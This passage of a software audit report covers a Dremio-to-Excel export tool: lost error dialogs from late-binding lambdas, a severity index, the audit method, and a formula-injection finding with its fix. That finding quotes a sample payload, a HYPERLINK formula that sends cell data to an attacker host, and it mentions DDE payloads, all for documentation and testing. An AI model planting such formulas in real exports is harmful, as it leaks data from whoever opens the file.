Tk catches it, prints a traceback to `stderr`, and continues. In the documented
PyInstaller windowed build ([README.md:215](../../dremio_Tool/README.md)) there
is no `stderr`, so a failed query or connection produces **no dialog, no log
line, and no console output** — the app simply appears to do nothing.

**An AST scan** — checking that a lambda genuinely references the except-clause
name, which a grep cannot — finds **four** affected sites: app.py:672, 675, 735,
737. That is both the `_log` call and the `showerror` call in *both* worker
threads, i.e. every failure path in the application.

**Measured, and the timing explains why it was missed:**

| Queue serviced mid-handler? | `_log` line | Error dialog |
|---|---|---|
| no | **lost** | **lost** |
| yes | survives | **lost** |

The callbacks are queued from a worker thread while the main thread is in
`mainloop()`, so some are dispatched *before* the `except` block ends, while `e`
is still bound. Those succeed. Any dispatched afterwards fail — and
`messagebox.showerror` is queued **last** on both paths, so it is the most
likely to fail and the only one the user can see. F-15's `root.update()` inside
`_log` is one of the things that can service the queue mid-handler, which is why
the log line often survives when the dialog does not.

**Measured delivery rate across every affected finding** — each failure driven
through the real `_execute_and_export`, 5 trials apiece:

| Finding | Failure path | Dialog shown | Log line | Progress label |
|---|---|---|---|---|
| F-01 | 60 columns → column-letter `ValueError` | **1/5** | 5/5 | `'Error'` |
| F-05 | control byte → `IllegalCharacterError` | **1/5** | 5/5 | `'Error'` |
| F-06 | duplicate column names → Series ambiguity | **0/5** | 4/5 | `'Error'` |
| F-25 | empty filename → `IsADirectoryError` | **1/5** | 4/5 | `'Error'` |
| F-14 | query itself fails (disconnect race shape) | **1/5** | 5/5 | `'Error'` |

So the modal dialog reaches the user roughly **one time in five**, and for the
most ordinary failing query in the app — a JOIN with duplicate column names —
not at all. The log-panel line *usually* survives, which is the one mitigating
fact: the app is not completely silent, it just fails to interrupt. On the
`_connect_thread` path there is no log panel equivalent for a user who has never
successfully connected, so that path is worse.

**Severity rationale:** High. It does not corrupt data, but it removes the error
report from every failure in the app, on a platform where the fallback channel
(`stderr`) does not exist. It also silently weakens F-04, F-14 and F-16, each of
which describes a dialog the user will frequently not receive.

**Fix:** bind the value at lambda-creation time —
`lambda msg=str(e): messagebox.showerror("Error", msg)` — or, better, capture
`str(e)` into a local before the `after` calls, since the string is all any of
these callbacks needs.

### Status: FIXED (Tier 1)

`error_message = str(e)` is now captured before the `after` calls in both
handlers. Fixed first, ahead of F-28, because it gates observability for
everything after it: until error dialogs work, no fix can be verified by
watching it fail.

Measured through the same five real failure paths, before and after:

| Finding | Dialog shown — before | after |
|---|---|---|
| F-01 | 1/5 | **5/5** |
| F-05 | 1/5 | **5/5** |
| F-06 | 0/5 | **5/5** |
| F-25 | 1/5 | **5/5** |
| F-14 | 1/5 | **5/5** |

`repro_f33_error_dialog_nameerror.py` now reports **NOT REPRODUCIBLE**.

**Consequently resolved:** the "Correction (Stage 0)" notes in F-01, F-04, F-05,
F-06, F-14, F-16 and F-25 describe **pre-fix** behaviour. Those findings'
original consequence narratives — that the user is shown a dialog — are accurate
again. The notes are kept as the record of what was measured and why the fix was
sequenced first.

---

## Index by severity

| Severity | Findings |
|---|---|
| **Critical** | F-03 (silent 32,767-char truncation), F-28 (world-readable base64 PAT) |
| **High** | F-01 (column letters ≥ 52), F-06 (duplicate column names), F-08 (32× memory), F-11 (corrupt file on every failure), F-14 (disconnect during query), F-16 (success reported as error), F-21 (malformed JSON blocks startup), F-25 (silent export overwrite), F-29 (unchecking "Remember token" keeps it), **F-33 (error dialogs raise NameError)** |
| **Medium** | F-02 (nan width), F-04 (row ceiling), F-05 (illegal characters), F-09 (client never closed), F-10 (reader leak), **F-12 (Tk off-thread reads — revised from High)**, F-13 (`is_running`/Stop), F-15 (`root.update()` reentrancy), F-17 (silent folder-open failure), F-18 (unguarded file I/O), F-20 (`print()` as error channel), F-22 (non-atomic writes), F-23 (`clean_hostname`), F-24 (validation bypass), F-30 (token retention), F-32 (unbounded floors) |
| **Low** | F-07 (sheet name latent), F-19 (button latching), F-26 (`truncate_string`), F-27 (label collisions), F-31 (dead code) |

## Method

Findings were reached by three different means, and the mix matters.

### After Stage 0 (current)

| | Before | After |
|---|---|---|
| Findings | 32 | **33** (F-33 found during Stage 0) |
| Have an **EXECUTED** component | 19 | **31** |
| **SOURCE only** — never mechanically verified | **9** | **0** |
| Have an executable repro script | 1 | **23** |

The nine SOURCE-only findings — F-07, F-13, F-14, F-15, F-17, F-19, F-22, F-29,
F-30, which included three of the four thread-safety findings and both
credential-lifecycle findings — were all converted to EXECUTED, along with the
SOURCE consequence-halves of F-04, F-08, F-16, F-24 and F-27. **Every one was
CONFIRMED**; none turned out to be reasoning about a bug that was not there,
though four needed correcting in detail (see the Stage 0 update at the top).

Two obstacles the original audit recorded as blocking were removed rather than
worked around:

- **No display.** Xvfb was installed; Tk runs headless under `xvfb-run -a`.
- **No live Dremio endpoint.** `dremio_Tool/tests/flightserver.py` implements a
  local Arrow Flight server with a `ServerAuthHandler` and a response-header
  middleware, which is enough for the app's own `DremioConnection.connect()` to
  authenticate against unmodified. F-13 and F-14 — which the audit expected
  might stay SOURCE — were both reproduced through it. It is not Dremio, and the
  scripts relying on that distinction say so.

Still without a dedicated script: F-05, F-09, F-10, F-12, F-18, F-20, F-23,
F-26, F-31, F-32. All were already EXECUTED or STATIC and sit in the later
remediation tiers, except **F-12**, which is High and is the obvious next script
to write — see the note in its entry.

### What was executed originally

**What was executed:**

- **Excel limits** — the body of `_export_to_excel` was copied verbatim and run
  against synthetic frames at each boundary; results read back from the written
  files and from the raw `sheet1.xml` inside the `.xlsx` zip.
- **Row ceiling** — proven at the openpyxl boundary (`ws.cell(row=1048577)`)
  plus a cheap measurement of the header offset. The full 1,048,577-row
  end-to-end write was deliberately not run.
- **Memory profile (F-08 table only)** — staged `ru_maxrss` sampling through the
  real call sequence on a 100,000 × 10 frame. `ru_maxrss` is a monotonic
  high-water mark, so this measures **peak growth per stage, not concurrent
  residency**; the copy counts in F-08 are SOURCE, derived from object lifetime.
- **Config durability** — a real `ConfigManager` constructed against 14 distinct
  corrupted files in a temp `$HOME`, then driven through the exact call sequence
  `DremioExporter.__init__` performs.
- **Validation / string helpers** — the real `utils.py` functions imported and
  called across their boundaries.
- **Library capability probes** — `FlightClient.close`, `FlightStreamReader.cancel`
  / `read_chunk`, `os.startfile`, and the openpyxl row ceiling, queried against
  the installed versions rather than assumed from documentation.
- **Credentials** — a real `_save_token_to_file` call, then `stat()` under
  explicitly set umasks **plus a plain-`open()` control file** in the same
  directory. The control is what revealed that this container ignores umask
  entirely, invalidating the mode numbers an earlier draft quoted (see F-28).

**What was STATIC (automated analysis over source, app not run):**

- **Thread safety (F-12)** — AST analysis over the real `app.py`: Tk-owned
  attributes identified from their constructors, worker-reachable methods
  computed transitively from `Thread(target=…)`, accesses nested in
  `root.after(...)` excluded.
- **Dead code (F-31)** — AST sweep across all six modules, cross-checked with
  grep, and manually corrected for framework-invoked callbacks.
- **Handler and I/O inventories (F-18, F-20)** — grep for `except`, `open(`,
  `print(`, `chmod`.

**What was SOURCE only — all resolved in Stage 0:**

~~F-13, F-14, F-15, F-17, F-19, F-22, F-29, F-30~~ and the consequence halves of
~~F-04, F-16, F-24, F-27~~ — every one now has an executable repro and an
EXECUTED tag. The original blockers and how they were removed:

- ~~**Tk could not be run at all** — no `$DISPLAY`, no Xvfb available.~~
  Xvfb installed; `xvfb-run -a python -c "import tkinter; tkinter.Tk()"` reports
  a 1280×1024 screen on Tcl 8.6.14, and the no-display control still fails with
  `TclError: no display name and no $DISPLAY environment variable`. The GUI
  claims are now observed failures rather than call-graph predictions —
  `root.update()` reentrancy fires, disconnect-during-query races.
  **F-12 remains the exception**: its access pattern is still STATIC-proven
  only, and the Stage 0 runs that exercised it did not crash. See its entry.
- ~~**F-27's Tk semantics** come from reading Tk's behaviour, not running it.~~
  Run. `ttk.Combobox.current()` does return the correct index despite duplicate
  display strings, as reasoned.
- ~~Reproducing these needs ... a live Dremio endpoint.~~ It did not. A local
  `FlightServerBase` with an auth handler and a response-header middleware is
  enough for the app's real `connect()`; see `dremio_Tool/tests/flightserver.py`.

---

## F-34 — Warehouse values run as Excel formulas on open  (High, CWE-1236)

**Added 2026-08-19, after the audit.** Not one of the original 33 findings; a
parity backport from the `dremio_excel` skill (its A-01). Recorded here so the
GUI's finding registry stays complete.

**What breaks.** The exporter wrote string cells verbatim. A text value that
begins `=`, `+`, `-` or `@` (or a leading TAB/CR a spreadsheet trims first) is
interpreted as a **formula** when the workbook is opened — classic CSV/formula
injection. Dremio rows are written by other users, so a cell such as
`=HYPERLINK("http://attacker/?"&A1)` or a DDE payload becomes a live formula on
whoever opens the export, with no action by the author.

**Contract chosen.** The same replace-and-say contract as F-05/F-03: each
triggering cell is prefixed with an apostrophe (Excel's text marker, hidden on
display) so it stays text, and the affected cells are named to the user in the
log and a dialog. Numeric columns hold real numbers and are left alone; only real
string cells are quoted. `--allow-formulas` has no GUI equivalent — the GUI
always neutralises, matching the skill's default.

**Reproduced by** `dremio_Tool/tests/repro_f34_formula_injection.py`: drives the
real `_export_to_excel` over `=1+1`, `=HYPERLINK(...)`, `+1`, `-2+3`, `@SUM(A1)`
plus a numeric column, reads the workbook back, and checks no cell reads as a
live formula (openpyxl `data_type 'f'`), numbers and safe strings are untouched,
the cells are reported, and `self.df` is not mutated.

### Status: FIXED (2026-08-19)

`app._neutralise_formula_cells()` runs on the post-sanitise frame in
`_export_to_excel`; `constants.py` carries `FORMULA_TRIGGER_CHARS` /
`FORMULA_PREFIX`; the worker reports the count like sanitisation. Verified NOT
REPRODUCIBLE with the fix and CONFIRMED against the reverted call. The skill's
equivalent is in `dremio_excel/export.py` (`_neutralise_formulas`).

